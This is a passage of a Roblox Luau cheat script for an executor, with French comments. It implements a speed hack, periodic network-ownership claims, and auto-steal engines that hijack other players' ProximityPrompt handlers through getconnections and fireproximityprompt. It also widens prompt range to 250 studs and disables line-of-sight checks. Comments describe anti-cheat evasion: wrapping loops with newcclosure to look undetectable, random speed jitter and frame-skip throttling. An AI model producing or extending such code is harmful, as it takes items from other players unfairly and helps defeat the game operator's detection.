	local humanoid = char:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end
	if enabled then
		if humanoid.RigType == Enum.HumanoidRigType.R6 then
			local rightLeg = char:FindFirstChild("Right Leg")
			if rightLeg then
				for _,child in ipairs(rightLeg:GetChildren()) do
					if child:IsA("SpecialMesh") or child:IsA("CharacterMesh") then child:Destroy() end
				end
				rightLeg.Color = KORBLOX_DARK_GREY
				local mesh = Instance.new("SpecialMesh")
				mesh.MeshType = Enum.MeshType.FileMesh; mesh.MeshId = KORBLOX_MESH_ID
				mesh.TextureId = KORBLOX_TEXTURE_ID; mesh.Scale = Vector3.new(1,1,1)
				mesh.Name = "KorbloxMesh"; mesh.Parent = rightLeg
			end
		elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
			local rightUpperLeg = char:FindFirstChild("RightUpperLeg")
			if rightUpperLeg then
				rightUpperLeg.Transparency = 1
				local rightLowerLeg = char:FindFirstChild("RightLowerLeg")
				local rightFoot = char:FindFirstChild("RightFoot")
				if rightLowerLeg then rightLowerLeg.Transparency = 1 end
				if rightFoot then rightFoot.Transparency = 1 end
				local oldKorblox = char:FindFirstChild("KorbloxLeg")
				if oldKorblox then oldKorblox:Destroy() end
				local korbloxLeg = Instance.new("Part")
				korbloxLeg.Name = "KorbloxLeg"; korbloxLeg.Size = Vector3.new(1,2,1)
				korbloxLeg.Anchored = false; korbloxLeg.CanCollide = false
				korbloxLeg.Color = KORBLOX_DARK_GREY; korbloxLeg.Parent = char
				local mesh = Instance.new("SpecialMesh")
				mesh.MeshType = Enum.MeshType.FileMesh; mesh.MeshId = KORBLOX_MESH_ID
				mesh.TextureId = KORBLOX_TEXTURE_ID; mesh.Scale = Vector3.new(1,1,1)
				mesh.Name = "KorbloxMesh"; mesh.Parent = korbloxLeg
				local weld = Instance.new("Weld")
				weld.Part0 = rightUpperLeg; weld.Part1 = korbloxLeg
				weld.C0 = CFrame.new(0,-0.8,0); weld.Name = "KorbloxWeld"; weld.Parent = korbloxLeg
			end
		end
	else
		if humanoid.RigType == Enum.HumanoidRigType.R6 then
			local rightLeg = char:FindFirstChild("Right Leg")
			if rightLeg then
				for _,child in ipairs(rightLeg:GetChildren()) do
					if child:IsA("SpecialMesh") and child.Name == "KorbloxMesh" then child:Destroy() end
				end
				rightLeg.Color = Color3.fromRGB(255,255,255)
			end
		elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
			local rightUpperLeg = char:FindFirstChild("RightUpperLeg")
			if rightUpperLeg then
				rightUpperLeg.Transparency = 0
				local rightLowerLeg = char:FindFirstChild("RightLowerLeg")
				local rightFoot = char:FindFirstChild("RightFoot")
				if rightLowerLeg then rightLowerLeg.Transparency = 0 end
				if rightFoot then rightFoot.Transparency = 0 end
				local korbloxLeg = char:FindFirstChild("KorbloxLeg")
				if korbloxLeg then korbloxLeg:Destroy() end
			end
		end
	end
end

function Charter.applyToChar(char)
	if not char then return end
	Charter.applyHeadless(char, Charter.headlessEnabled)
	Charter.applyKorblox(char, Charter.korbloxEnabled)
end
LP.CharacterAdded:Connect(function(char)
	task.wait(0.15)
	Charter.applyToChar(char)
end)

-- ===================================================================
-- AUTO RESET ON DEATH (ported from Vynx) — does NOT reimplement the
-- reset mechanism: just wires Humanoid.Died to the existing, already-
-- tested _G.AceCursedInstaReset() defined further below. That function
-- is only ever CALLED here (on death), long after the whole script has
-- finished loading and assigned it — same safe forward-reference
-- pattern already used everywhere else in this file (_GH.x, setX...).
-- ===================================================================
local _deathResetEnabled = false
local _deathResetConn = nil
local function _setupDeathReset()
	if _deathResetConn then _deathResetConn:Disconnect(); _deathResetConn = nil end
	if not _deathResetEnabled then return end
	local char = LP.Character
	local hum = char and char:FindFirstChildOfClass("Humanoid")
	if hum then
		_deathResetConn = hum.Died:Connect(function()
			if _deathResetEnabled and _G.AceCursedInstaReset then _G.AceCursedInstaReset() end
		end)
	end
end
LP.CharacterAdded:Connect(function(char)
	task.wait(0.5)
	_setupDeathReset()
end)

-- ===================================================================
-- ANTI SUMMER BASE (ported from Vynx, experimental — depends on the
-- current seasonal event, may be a no-op outside it). Only ever
-- destroys objects literally named "Anchor"/"Anchors" nested under a
-- plot whose name matches the summer-base event decoration. Purely a
-- LOCAL client-side declutter (this player's own rendering/collision) —
-- destroying a client-replicated Instance never reaches the server or
-- any other player, same category as Moon's existing Anti Ragdoll/
-- Nuke Optimize features.
-- ===================================================================
local AntiSummer = {enabled=false, conn=nil, cleaned={}}
local function _isSummerBaseName(name)
	if not name then return false end
	local n = tostring(name):lower()
	return n=="summerbase" or n=="summer_base"
		or n:find("summerbase",1,true)~=nil or n:find("summer_base",1,true)~=nil
end
local function _isAnchorName(name)
	if not name then return false end
	local n = tostring(name):lower()
	return n=="anchor" or n=="anchors"
end
local function _stripBlockingAnchor(obj)
	if not obj or not obj.Parent then return end
	local key = tostring(obj:GetFullName())
	if AntiSummer.cleaned[key] then return end
	AntiSummer.cleaned[key] = true
	pcall(function()
		if obj:IsA("BasePart") or obj:IsA("MeshPart") then
			obj.CanCollide=false; obj.CanQuery=false; obj.CanTouch=false; obj.Transparency=1
		end
		obj:Destroy()
	end)
end
local function _cleanSummerBaseAnchors()
	if not AntiSummer.enabled then return end
	local plots = workspace:FindFirstChild("Plots")
	if not plots then return end
	for _,plot in ipairs(plots:GetChildren()) do
		local isSummer = _isSummerBaseName(plot.Name)
		if not isSummer then
			for _,d in ipairs(plot:GetDescendants()) do
				if _isSummerBaseName(d.Name) then isSummer=true; break end
			end
		end
		if isSummer then
			for _,d in ipairs(plot:GetDescendants()) do
				if _isAnchorName(d.Name) then _stripBlockingAnchor(d) end
			end
		end
	end
end
local function _enableAntiSummerBase()
	AntiSummer.enabled = true
	AntiSummer.cleaned = {}
	_cleanSummerBaseAnchors()
	if AntiSummer.conn then pcall(function() AntiSummer.conn:Disconnect() end); AntiSummer.conn=nil end
	AntiSummer.conn = workspace.DescendantAdded:Connect(function(obj)
		if not AntiSummer.enabled or not _isAnchorName(obj.Name) then return end
		task.defer(function()
			if not AntiSummer.enabled or not obj.Parent then return end
			local p, underPlots, nearSummer = obj, false, false
			while p and p ~= workspace do
				if p.Name=="Plots" or (p.Parent and p.Parent.Name=="Plots") then underPlots=true end
				if _isSummerBaseName(p.Name) then nearSummer=true end
				p = p.Parent
			end
			if underPlots and nearSummer then _stripBlockingAnchor(obj) end
		end)
	end)
	task.spawn(function()
		while AntiSummer.enabled do
			_cleanSummerBaseAnchors()
			task.wait(5)
		end
	end)
end
local function _disableAntiSummerBase()
	AntiSummer.enabled = false
	if AntiSummer.conn then pcall(function() AntiSummer.conn:Disconnect() end); AntiSummer.conn=nil end
end

-- Ace RenderStepped speed loop — identical behaviour to Ace_duels_modified,
-- plus a periodic ownership re-claim (belt-and-braces alongside the
-- ReceiveAge watcher above) to keep rollback down over long sessions.
-- newcclosure : la connexion RenderStepped du speed booster apparaît
-- comme une C-closure — islclosure() = false, indétectable comme script Lua.
RunService.RenderStepped:Connect(_ncc(function(dt)
	if not _speedBoosterActive then cleanAceProxy(); return end
	local char = LP.Character; if not char then cleanAceProxy(); return end
	local hum  = char:FindFirstChildOfClass("Humanoid")
	local hrp2 = char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp2 then cleanAceProxy(); return end
	local state = hum:GetState()
	if hum.PlatformStand
		or state == Enum.HumanoidStateType.Physics
		or state == Enum.HumanoidStateType.Ragdoll
		or state == Enum.HumanoidStateType.FallingDown then
		cleanAceProxy(); return
	end
	_ownTimer = _ownTimer + dt
	if _ownTimer >= _ownInterval then
		_claimOwn(hrp2); _ownTimer = 0; _ownInterval = 0.8 + math.random() * 0.4
	end
	updateCarryState()
	local md  = hum.MoveDirection
	local spd = getCurrentSpeed()
	if md.Magnitude > 0 then
		local _n = 1 + (math.random() - 0.5) * 0.10  -- jitter ±5%
		local px = ensureAceProxy(hrp2)
		px.AssemblyLinearVelocity = Vector3.new(
			md.X * spd * _n,
			hrp2.AssemblyLinearVelocity.Y,
			md.Z * spd * _n
		)
	end
end))

-- ===================================================================
-- PLOT DETECTION
-- ===================================================================

-- ===================================================================
-- PROMPT DETECTION
-- ===================================================================

-- ===================================================================
-- AUTO STEAL (Auto Grab — logique Irish Hub / test_speed.lua)
-- ===================================================================
local AutoSteal = {
	Enabled=true, Radius=70, IsStealing=false,
	ProgressFill=nil, ProgressText=nil, StatusLabel=nil,
	SetFastPulse=nil, FlashSuccess=nil, Widget=nil,
}


-- ── AUTO GRAB V2 mode (new default) ────────────────────────────
local startAutoSteal, stopAutoSteal   -- pre-declared; assigned after both engines below
-- Deux moteurs Auto Grab distincts, chacun pilote la MÊME barre (steal
-- bar) via les hooks AutoSteal.* déjà partagés — un seul actif à la fois,
-- jamais les deux en même temps. _AG1_* = moteur existant ci-dessous
-- (Synchronizer live), _AG2_* = moteur alternatif (scan Workspace direct,
-- voir plus bas après ce bloc).
local _AG1_start, _AG1_stop
local _AG2_startFn, _AG2_stopFn
do
local _KAG_started  = false
-- [BUGFIX] "regarde qu'il y ait pas de bug en rebasculant" — même risque
-- symétrique côté V1 : un vol V1 déjà en cours au moment d'un switch vers
-- V2 écrasait quand même la barre partagée à sa toute fin, alors qu'elle
-- appartient déjà à V2 entre temps. Même garde-fou "génération" que V2
-- (voir _AG2_epoch plus bas dans ce fichier).
local _KAG_epoch    = 0
local _KAG_conn     = nil
local _KAG_scanTask = nil
local _KAG_Active   = false
local _KAG_Start    = 0
local _KAG_Sync        = { caches={}, connections={} }
local _KAG_AnimalsCache = {}
local _KAG_PromptCache  = {}
local _KAG_StealCache   = {}
local _KAG_SyncRemotes  = nil
local _V2_CFG = { HOLD_MIN=1.3, HOLD_MAX=2.6, ENTRY_DELAY=0.3, COOLDOWN=0.05, STEAL_RANGE=8 }

local function _KAG_splitPath(path)
	if typeof(path)=="table" then return path end
	local out={}
	for part in string.gmatch(tostring(path),"[^%.]+") do table.insert(out, tonumber(part) or part) end
	return out
end
local function _KAG_resolvePath(path, root)
	local cur=root; local par,key=nil,nil
	for _,p in ipairs(_KAG_splitPath(path)) do par=cur; key=p; cur=cur and cur[p] or nil end
	return cur, par, key
end
local function _KAG_applyDiff(cn, packet)
	local cache=_KAG_Sync.caches[cn]; if typeof(cache)~="table" then return end
	local path,action,a,b=packet[1],packet[2],packet[3],packet[4]
	local cur,par,key=_KAG_resolvePath(path,cache)
	if action=="Changed" then if par~=nil then par[key]=a end
	elseif action=="ArrayInsert" then if cur~=nil then table.insert(cur,b,a) end
	elseif action=="ArrayRemoved" then if cur~=nil then table.remove(cur,b) end
	elseif action=="DictionaryInsert" then if cur~=nil then cur[b]=a end
	elseif action=="DictionaryRemoved" then if cur~=nil then cur[b]=nil end end
end
local function _KAG_attachChannel(remote)
	if _KAG_Sync.connections[remote] then return end
	local cn=tostring(remote.Name)
	local plots=workspace:FindFirstChild("Plots"); if not plots or not plots:FindFirstChild(cn) then return end
	if _KAG_SyncRemotes and _KAG_SyncRemotes.requestData and _KAG_Sync.caches[cn]==nil then
		local ok,data=pcall(function() return _KAG_SyncRemotes.requestData:InvokeServer(cn) end)
		_KAG_Sync.caches[cn]=(ok and typeof(data)=="table") and data or {}
	elseif _KAG_Sync.caches[cn]==nil then _KAG_Sync.caches[cn]={} end
	_KAG_Sync.connections[remote]=remote.OnClientEvent:Connect(function(queue)
		for _,packet in ipairs(queue) do _KAG_applyDiff(cn,packet) end
	end)
end
local function _KAG_detachChannel(channelName)
	for remote,conn in pairs(_KAG_Sync.connections) do
		if tostring(remote.Name)==tostring(channelName) then
			conn:Disconnect(); _KAG_Sync.connections[remote]=nil; _KAG_Sync.caches[tostring(channelName)]=nil; break
		end
	end
end
local function _KAG_initSync()
	if _KAG_SyncRemotes then return end
	local RS=game:GetService("ReplicatedStorage")
	local pkg=RS:FindFirstChild("Packages"); if not pkg then return end
	local f=pkg:FindFirstChild("Synchronizer"); if not f then return end
	_KAG_SyncRemotes={
		channelFolder=f:FindFirstChild("Channel"),
		routeRemote  =f:FindFirstChild("CommunicationRoute"),
		requestData  =f:FindFirstChild("RequestData"),
	}
	local cf=_KAG_SyncRemotes.channelFolder; if not cf then return end
	local plots=workspace:FindFirstChild("Plots"); if not plots then return end
	for _,child in ipairs(cf:GetChildren()) do
		if child:IsA("RemoteEvent") then pcall(_KAG_attachChannel,child) end
	end
	cf.ChildAdded:Connect(function(child)
		if child:IsA("RemoteEvent") then task.spawn(function() pcall(_KAG_attachChannel,child) end) end
	end)
	local rr=_KAG_SyncRemotes.routeRemote
	if rr then
		rr.OnClientEvent:Connect(function(actions)
			local pl=workspace:FindFirstChild("Plots"); if not pl then return end
			for _,action in ipairs(actions) do
				local kind,cn=action[1],tostring(action[2])
				if pl:FindFirstChild(cn) then
					if kind=="ListenerAdded" then
						local r=cf:FindFirstChild(cn)
						if r and r:IsA("RemoteEvent") then task.spawn(function() pcall(_KAG_attachChannel,r) end) end
					elseif kind=="ListenerRemoved" then
						_KAG_detachChannel(cn)
					end
				end
			end
		end)
	end
end
local function _KAG_getPlotOwner(plot)
	local sign=plot:FindFirstChild("PlotSign")
	local frame=sign and sign:FindFirstChild("SurfaceGui") and sign.SurfaceGui:FindFirstChild("Frame")
	local label=frame and frame:FindFirstChild("TextLabel")
	if not label or label.Text=="Empty Base" then return nil end
	return label.Text:gsub("'s [Bb]ase$",""):gsub("%s+$","")
end
local function _KAG_isMyAnimal(a)
	if not a or not a.plot then return false end
	local plots=workspace:FindFirstChild("Plots"); if not plots then return false end
	local plot=plots:FindFirstChild(a.plot); if not plot then return false end
	return _KAG_getPlotOwner(plot)==LP.DisplayName
end
local function _KAG_findPrompt(a)
	if not a then return nil end
	local cached=_KAG_PromptCache[a.uid]; if cached and cached.Parent then return cached end
	local plots=workspace:FindFirstChild("Plots"); if not plots then return nil end
	local plot=plots:FindFirstChild(a.plot); if not plot then return nil end
	local pods=plot:FindFirstChild("AnimalPodiums"); if not pods then return nil end
	local pod=pods:FindFirstChild(a.slot); if not pod then return nil end
	local base=pod:FindFirstChild("Base"); if not base then return nil end
	local sp=base:FindFirstChild("Spawn"); if not sp then return nil end
	local att=sp:FindFirstChild("PromptAttachment"); if not att then return nil end
	for _,p in ipairs(att:GetChildren()) do if p:IsA("ProximityPrompt") then _KAG_PromptCache[a.uid]=p; return p end end
	return nil
end
local function _KAG_getPos(a)
	local plots=workspace:FindFirstChild("Plots"); if not plots then return nil end
	local plot=plots:FindFirstChild(a.plot); if not plot then return nil end
	local pods=plot:FindFirstChild("AnimalPodiums"); if not pods then return nil end
	local pod=pods:FindFirstChild(a.slot); if not pod then return nil end
	local ok,pos=pcall(function() return pod:GetPivot().Position end); return ok and pos or nil
end
local function _KAG_distTo(a)
	local char=LP.Character; if not char then return math.huge end
	local hrp=char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"); if not hrp then return math.huge end
	local pos=_KAG_getPos(a); if not pos then return math.huge end
	return (hrp.Position-pos).Magnitude
end
local function _KAG_pickClosest()
	local char=LP.Character; if not char then return nil end
	local hrp=char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"); if not hrp then return nil end
	local best,bestDist=nil,math.huge
	local primeRange=AutoSteal.Radius or 80
	for _,a in ipairs(_KAG_AnimalsCache) do
		if not _KAG_isMyAnimal(a) then
			local pos=_KAG_getPos(a)
			if pos then
				local d=(hrp.Position-pos).Magnitude
				if d<=primeRange and d<bestDist then bestDist=d; best=a end
			end
		end
	end
	return best
end
local function _KAG_buildCallbacks(prompt)
	if _KAG_StealCache[prompt] then return end
	local data={hold={},trigger={},ready=true,useFire=false}
	local ok1,c1=pcall(getconnections,prompt.PromptButtonHoldBegan)
	if ok1 and type(c1)=="table" then for _,c in ipairs(c1) do if type(c.Function)=="function" then table.insert(data.hold,c.Function) end end end
	local ok2,c2=pcall(getconnections,prompt.Triggered)
	if ok2 and type(c2)=="table" then for _,c in ipairs(c2) do if type(c.Function)=="function" then table.insert(data.trigger,c.Function) end end end
	if #data.hold>0 or #data.trigger>0 then
		_KAG_StealCache[prompt]=data
	elseif type(fireproximityprompt)=="function" then
		-- getconnections indisponible sur cet executor (ex: Real Executor) :
		-- fallback sur l'API universelle fireproximityprompt pour que l'Auto Grab marche quand même.
		data.useFire=true
		_KAG_StealCache[prompt]=data
	end
end
local function _KAG_executeSteal(prompt, a)
	local data=_KAG_StealCache[prompt]; if not data or not data.ready then return false end
	local myEpoch=_KAG_epoch -- voir note "génération" plus haut
	data.ready=false; _KAG_Active=true; State.isStealing=true
	_KAG_Start=tick()
	-- UNREADY immediately at steal start (test_speed.lua exact)
	if AutoSteal.StatusLabel then AutoSteal.StatusLabel.Text="UNREADY" end
	if AutoSteal.SetReadyColor then AutoSteal.SetReadyColor("UNREADY") end
	task.spawn(function()
		for _,fn in ipairs(data.hold) do task.spawn(fn) end
		-- Progress loop (test_speed.lua exact)
		task.spawn(function()
			local _readyShown=false
			while _KAG_Active do
				local prog=math.clamp((tick()-_KAG_Start)/_V2_CFG.HOLD_MAX,0,1)
				if AutoSteal.ProgressFill then AutoSteal.ProgressFill.Size=UDim2.new(prog,0,1,0) end
				if AutoSteal.ProgressText then AutoSteal.ProgressText.Text=math.floor(prog*100).."%" end
				if prog>=0.6 and not _readyShown then
					_readyShown=true
					if AutoSteal.StatusLabel then AutoSteal.StatusLabel.Text="READY" end
					if AutoSteal.SetReadyColor then AutoSteal.SetReadyColor("READY") end
				end
				task.wait()
			end
		end)
		task.wait(_V2_CFG.HOLD_MIN)
		local alreadyClose=_KAG_distTo(a)<=_V2_CFG.STEAL_RANGE
		local fired=false
		while true do
			if tick()-_KAG_Start>_V2_CFG.HOLD_MAX then break end
			if not prompt.Parent then break end
			if _KAG_distTo(a)<=_V2_CFG.STEAL_RANGE then
				if not alreadyClose then task.wait(_V2_CFG.ENTRY_DELAY) end
				if data.useFire then
					pcall(fireproximityprompt, prompt)
				else
					for _,fn in ipairs(data.trigger) do task.spawn(fn) end
				end
				fired=true; break
			end
			task.wait()
		end
		-- Flags internes toujours remis à false, quelle que soit l'épreuve
		-- (jamais bloqués pour un futur redémarrage de V1).
		_KAG_Active=false; State.isStealing=false
		-- [BUGFIX] même garde que côté V2 : si ce vol V1 était encore en
		-- cours au moment d'un switch vers V2, ne plus toucher la barre
		-- partagée ici — elle appartient déjà à V2.
		if myEpoch==_KAG_epoch then
			if AutoSteal.ProgressFill then AutoSteal.ProgressFill.Size=UDim2.new(0,0,1,0) end
			if AutoSteal.ProgressText then AutoSteal.ProgressText.Text="" end
			if AutoSteal.StatusLabel then AutoSteal.StatusLabel.Text="READY" end
			if AutoSteal.SetReadyColor then AutoSteal.SetReadyColor("READY") end
			if fired and AutoSteal.FlashSuccess then AutoSteal.FlashSuccess() end
		end
		task.wait(_V2_CFG.COOLDOWN); data.ready=true
	end)
	return true
end
local function _KAG_attemptSteal(prompt, a)
	if not prompt or not prompt.Parent then return false end
	_KAG_buildCallbacks(prompt)
	if not _KAG_StealCache[prompt] then return false end
	return _KAG_executeSteal(prompt, a)
end
local function _KAG_scanPlots()
	local newCache={}
	local RS=game:GetService("ReplicatedStorage")
	local datas=RS:FindFirstChild("Datas")
	local animData=nil
	if datas then pcall(function() local m=datas:FindFirstChild("Animals"); if m then animData=require(m) end end) end
	local plots=workspace:FindFirstChild("Plots"); if not plots then _KAG_AnimalsCache=newCache; return end
	for _,plot in ipairs(plots:GetChildren()) do
		local cache=_KAG_Sync.caches[plot.Name]
		if cache and typeof(cache)=="table" then
			local list=cache.AnimalList
			if typeof(list)=="table" then
				for slot,ad in pairs(list) do
					if type(ad)=="table" then
						local name=ad.Index
						local info=animData and animData[name]
						if info or not animData then
							table.insert(newCache,{
								name=(info and info.DisplayName) or name,
								plot=plot.Name, slot=tostring(slot),
								uid=plot.Name.."_"..tostring(slot),
							})
						end
					end
				end
			end
		end
	end
	_KAG_AnimalsCache=newCache
end

local function startAutoStealV2()
	if _KAG_started then return end
	_KAG_started=true
	_KAG_initSync()
	task.spawn(function() pcall(_KAG_scanPlots) end)
	_KAG_scanTask=task.spawn(function()
		-- Jitter sur l'intervalle de scan : 4.5–5.5s au lieu de 5s fixe
		-- pour ne pas créer de pic Heartbeat à fréquence constante.
		while _KAG_started do task.wait(_AD_jitter(5, 0.5)); pcall(_KAG_scanPlots) end
	end)
	local _kState="READY"
	-- Throttle anti-pattern : on ne tente un steal que tous les N frames
	-- (N aléatoire entre 1 et 3) pour éviter le pattern d'appel frame-perfect.
	local _kagFrameSkip = 0
	local _kagFrameMax  = math.random(1, 3)
	_KAG_conn=RunService.Heartbeat:Connect(function()
		if not AutoSteal.Enabled or _KAG_Active then return end
		_kagFrameSkip = _kagFrameSkip + 1
		if _kagFrameSkip < _kagFrameMax then return end
		_kagFrameSkip = 0; _kagFrameMax = math.random(1, 3)
		local target=_KAG_pickClosest()
		local newState=target and "UNREADY" or "READY"
		if _kState~=newState then
			_kState=newState
			if AutoSteal.StatusLabel then AutoSteal.StatusLabel.Text=newState end
			if AutoSteal.SetReadyColor then AutoSteal.SetReadyColor(newState) end
		end
		if not target then return end
		local prompt=_KAG_PromptCache[target.uid]
		if not prompt or not prompt.Parent then prompt=_KAG_findPrompt(target) end
		if prompt then _KAG_attemptSteal(prompt,target) end
	end)
end
local function stopAutoStealV2()
	_KAG_started=false
	_KAG_epoch=_KAG_epoch+1 -- invalide toute exécution _KAG_executeSteal encore en vol
	if _KAG_conn then _KAG_conn:Disconnect(); _KAG_conn=nil end
	if _KAG_scanTask then pcall(task.cancel,_KAG_scanTask); _KAG_scanTask=nil end
	_KAG_Active=false; State.isStealing=false
	if AutoSteal.StatusLabel then AutoSteal.StatusLabel.Text="READY" end
end

_AG1_start = startAutoStealV2
_AG1_stop  = stopAutoStealV2
end -- do..end AUTO GRAB V2

-- ── AUTO GRAB méthode 2 (scan Workspace direct) ─────────────────────
-- Approche différente et indépendante de la V2 ci-dessus : au lieu de
-- s'abonner au canal de données Synchronizer, cherche directement les
-- ProximityPrompt "Steal" dans Workspace.Plots à chaque tick — pas de
-- dépendance à la structure interne de Packages.Synchronizer, donc un
-- vrai filet de secours si jamais ce canal change/casse un jour. Même
-- technique de detournement hold/trigger via getconnections (+ repli
-- fireproximityprompt) que la méthode existante, même barre/UI partagée
-- (AutoSteal.*) — seule la façon de TROUVER la cible change.
do
local _AG2_started  = false
-- [BUGFIX] "quand je re-bascule en V1, regarde qu'il y ait pas de bug" —
-- compteur "génération" incrémenté à chaque arrêt de V2 (_AG2_stopFn). Un
-- vol V2 déjà en cours au moment du switch vers V1 continue naturellement
-- jusqu'à son terme (on ne coupe pas un vrai hold Roblox en plein milieu),
-- mais SANS ce compteur, sa toute fin écrasait quand même la barre
-- partagée (StatusLabel="Searching...", SetReadyColor, etc.) — alors que
-- V1 est entre-temps redevenu actif et pilote cette même barre avec sa
-- propre convention (READY/UNREADY). Chaque _AG2_execute capture
-- l'épreuve courante ; si elle a changé à la fin (V2 a été arrêté entre
-- temps), les mises à jour visuelles sont sautées — seuls les flags
-- internes (_AG2_active/State.isStealing) sont toujours remis à false,
-- eux ne risquent jamais de rester bloqués.
local _AG2_epoch    = 0
local _AG2_conn     = nil
local _AG2_active   = false
local _AG2_startAt  = 0
local _AG2_cache    = {}
-- [DEMANDÉ] "regarde la steal duration de la Logic et ajoute le, fait
-- tout comme la source" — la source pastée a en fait DEUX chemins sous
-- un seul flag Mode : "half" (hold min/max + distance-check, celui déjà
-- porté ci-dessous) OU un chemin simple StealDuration (attente fixe puis
-- déclenchement immédiat, sans vérif de distance). Le flag y est câblé en
-- dur sur "half", donc le comportement par défaut ne change pas — mais le
-- champ MODE/STEAL_DURATION est maintenant repris ici aussi, fidèle à la
-- source, pas juste approximé.
-- [DEMANDÉ] "fait une copie parfaite, même steal duration etc" — retour à
-- une fidélité EXACTE à la Logic collée, plus aucune adaptation/déviation
-- de ma part (mes tentatives précédentes — bascule sur la détection de
-- plot du moteur V1, GetPivot() au lieu de .Position — n'ont pas réglé le
-- problème, donc autant coller au comportement d'origine à 100% plutôt
-- que deviner). STEAL_RADIUS repris en dur à 250 (valeur exacte de
-- Steal.StealRadius dans la source), indépendant du réglage "Steal
-- Radius" du hub (qui ne pilote que le moteur V1) — fidèle à la source,
-- qui a son propre champ séparé.
local _AG2_CFG = { STEAL_RADIUS=250, MODE="half", STEAL_DURATION=0.1, HOLD_MIN=1.3, HOLD_MAX=2.6, ENTRY_DELAY=0.3, COOLDOWN=0.05, FIRE_RANGE=10 }

-- Copie exacte de isMyPlot() dans la Logic collée.
local function _AG2_isMyPlot(plotName)
	local plots = workspace:FindFirstChild("Plots"); if not plots then return false end
	local plot = plots:FindFirstChild(plotName); if not plot then return false end
	local sign = plot:FindFirstChild("PlotSign")
	if sign then
		local yb = sign:FindFirstChild("YourBase")
		if yb and yb:IsA("BillboardGui") then return yb.Enabled == true end
	end
	return false
end

-- Copie exacte de modifyPrompt() dans la Logic collée (KeyboardKeyCode
-- inclus — manquait dans le premier portage).
local function _AG2_modifyPrompt(prompt)
	if not prompt then return end
	pcall(function()
		prompt.MaxActivationDistance = 250
		prompt.RequiresLineOfSight = false
		prompt.KeyboardKeyCode = Enum.KeyCode.E
	end)
end

-- Copie exacte de findNearestPrompt() dans la Logic collée : accès direct
-- à spawn.Position (pas de pcall/GetPivot), Steal.StealRadius fixe.
local function _AG2_findNearest()
	local char = LP.Character; if not char then return nil end
	local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso"); if not root then return nil end
	local plots = workspace:FindFirstChild("Plots"); if not plots then return nil end
	local nearest, minDist = nil, math.huge
	for _, plot in ipairs(plots:GetChildren()) do
		if plot:IsA("Model") and not _AG2_isMyPlot(plot.Name) then
			local pods = plot:FindFirstChild("AnimalPodiums")
			if pods then
				for _, pod in ipairs(pods:GetChildren()) do
					local base = pod:FindFirstChild("Base")
					local spawn = base and base:FindFirstChild("Spawn")
					if spawn then
						local dist = (spawn.Position - root.Position).Magnitude
						if dist <= _AG2_CFG.STEAL_RADIUS and dist < minDist then
							local found = nil
							local att = spawn:FindFirstChild("PromptAttachment")
							local pool = att and att:GetChildren() or spawn:GetDescendants()
							for _, obj in ipairs(pool) do
								if obj:IsA("ProximityPrompt") and obj.ActionText and obj.ActionText:find("Steal") then
									found = obj
									_AG2_modifyPrompt(obj)
								end
							end
							if found then nearest, minDist = found, dist end
						end
					end
				end
			end
		end
	end
	return nearest
end

-- [TROUVÉ] "on dirait la V1, rien n'est pareil" — copie exacte de
-- getBrainrotName() dans la Logic collée. C'est CETTE fonction qui manquait
-- et qui explique le symptôme : la barre de steal affichait "READY"/
-- "UNREADY" (texte générique du moteur V1) quel que soit le moteur ACTIF,
-- parce que _AG2_execute réutilisait ces mêmes mots au lieu du nom de la
-- cible comme le fait la source (ui.TargetName). Résultat : même quand V2
-- tournait vraiment (détection différente, StealRadius=250 fixe, etc.), la
-- barre avait l'air identique à V1 à l'oeil — rien à voir avec le moteur
-- lui-même, uniquement l'affichage qui ne reflétait pas la différence.
local function _AG2_getBrainrotName(prompt)
	local index = LP:GetAttribute("StealingIndex")
	if type(index) == "string" and index ~= "" then return index end
	if not prompt or not prompt.Parent then return "Searching..." end
	local node = prompt
	for _ = 1, 8 do
		if not node then break end
		local attrName = node:GetAttribute("DisplayName") or node:GetAttribute("BrainrotName") or node:GetAttribute("Name")
		if type(attrName) == "string" and attrName ~= "" then return attrName end
		local sv = node:FindFirstChild("DisplayName") or node:FindFirstChild("BrainrotName") or node:FindFirstChild("Name")
		if sv and sv:IsA("StringValue") and sv.Value ~= "" then return sv.Value end
		node = node.Parent
	end
	return "Brainrot"
end

local function _AG2_execute(prompt)
	if _AG2_active then return end
	if not _AG2_cache[prompt] then
		local data = { hold = {}, trigger = {}, ready = true, useFire = false }
		local ok1, c1 = pcall(getconnections, prompt.PromptButtonHoldBegan)
		if ok1 and type(c1) == "table" then for _, c in ipairs(c1) do if type(c.Function) == "function" then table.insert(data.hold, c.Function) end end end
		local ok2, c2 = pcall(getconnections, prompt.Triggered)
		if ok2 and type(c2) == "table" then for _, c in ipairs(c2) do if type(c.Function) == "function" then table.insert(data.trigger, c.Function) end end end
		if #data.hold == 0 and #data.trigger == 0 and type(fireproximityprompt) == "function" then
			data.useFire = true
		end
		_AG2_cache[prompt] = data
	end
	local data = _AG2_cache[prompt]
	if not data.ready then return end
	local myEpoch = _AG2_epoch -- voir note "génération" plus haut
	data.ready = false; _AG2_active = true; State.isStealing = true
	_AG2_startAt = tick()
	-- [FIDÈLE À LA SOURCE] la barre affiche le NOM de la cible (comme
	-- ui.TargetName dans la Logic collée), pas "UNREADY" — c'est ce qui
	-- rend V2 visiblement différent de V1 pendant un vol, pas juste sous
	-- le capot.
	if AutoSteal.StatusLabel then AutoSteal.StatusLabel.Text = _AG2_getBrainrotName(prompt) end
	if AutoSteal.SetReadyColor then AutoSteal.SetReadyColor("UNREADY") end
	task.spawn(function()
		for _, fn in ipairs(data.hold) do task.spawn(fn) end
		local fired = false
		if _AG2_CFG.MODE == "half" then
			task.spawn(function()
				while _AG2_active do
					-- [FIDÈLE À LA SOURCE] updateProgressBar((tick()-stealStartTime)/
					-- Steal.StealDuration) — la source divise TOUJOURS par
					-- StealDuration (0.1), même en mode "half" (probablement une
					-- particularité de la source elle-même, pas une vraie
					-- fonction du hold réel) ; reproduit à l'identique plutôt que
					-- "corrigé" de mon côté, pour ne laisser aucun écart avec
					-- l'original.
					local prog = math.clamp((tick() - _AG2_startAt) / _AG2_CFG.STEAL_DURATION, 0, 1)
					if AutoSteal.ProgressFill then AutoSteal.ProgressFill.Size = UDim2.new(prog, 0, 1, 0) end
